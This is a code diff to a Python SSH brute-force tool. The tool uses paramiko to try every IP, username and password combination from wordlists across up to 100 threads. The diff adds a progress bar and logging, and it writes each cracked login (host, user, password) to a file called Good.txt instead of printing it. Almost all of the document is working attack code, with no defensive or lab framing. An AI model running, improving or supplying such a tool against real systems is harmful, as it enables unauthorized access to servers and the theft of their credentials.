@@ -5,11 +5,15 @@ import getopt
 import paramiko
 import threading
 import time
+import logging
+from tqdm import tqdm # type: ignore
+from datetime import datetime
 
+
+
+logging.basicConfig(filename='bruteforce.log', level=logging.CRITICAL)
 MAX_THREADS = 100
 TIMEOUT = 10  # in seconds
-UI_WIDTH = 80
-UI_HEIGHT = 24
 
 class BruteForceArgs:
     def __init__(self, ip, username, password):
@@ -22,7 +26,8 @@ def attempt_connect(args):
         session = paramiko.SSHClient()
         session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         session.connect(str(args.ip), username=args.username, password=args.password, timeout=5)
-        print(f"Success: {args.ip} {args.username} {args.password}")
+        with open("Good.txt", "a") as f:
+            f.write(f"Success: {args.ip} {args.username} {args.password}\n")
         session.close()
     except:
         pass
@@ -30,13 +35,6 @@ def attempt_connect(args):
 def read_file(filename):
     with open(filename, 'r') as file:
         return [line.strip() for line in file.readlines()]
-
-def draw_ui():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print('+' + '-' * (UI_WIDTH - 2) + '+')
-    for _ in range(UI_HEIGHT - 2):
-        print('|' + ' ' * (UI_WIDTH - 2) + '|')
-    print('+' + '-' * (UI_WIDTH - 2) + '+')
 
 def main():
     try:
@@ -78,6 +76,9 @@ def main():
     user_list = read_file(user_list_file)
     password_list = read_file(password_list_file)
 
+    total_combinations = len(ip_list) * len(user_list) * len(password_list)
+    progress_bar = tqdm(total=total_combinations, unit="combination", unit_scale=True)
+
     threads_args = []
 
     for ip in ip_list:
@@ -92,6 +93,7 @@ def main():
                     for t in threads:
                         t.join(timeout)
                     threads_args.clear()
+                    progress_bar.update(max_threads)
                 threads_args.append(BruteForceArgs(ip, user, password))
 
     threads = []
@@ -101,8 +103,8 @@ def main():
         threads.append(t)
     for t in threads:
         t.join(timeout)
-
-    draw_ui()
+    progress_bar.update(len(threads_args))
+    progress_bar.close()
 
 if __name__ == "__main__":
     main()
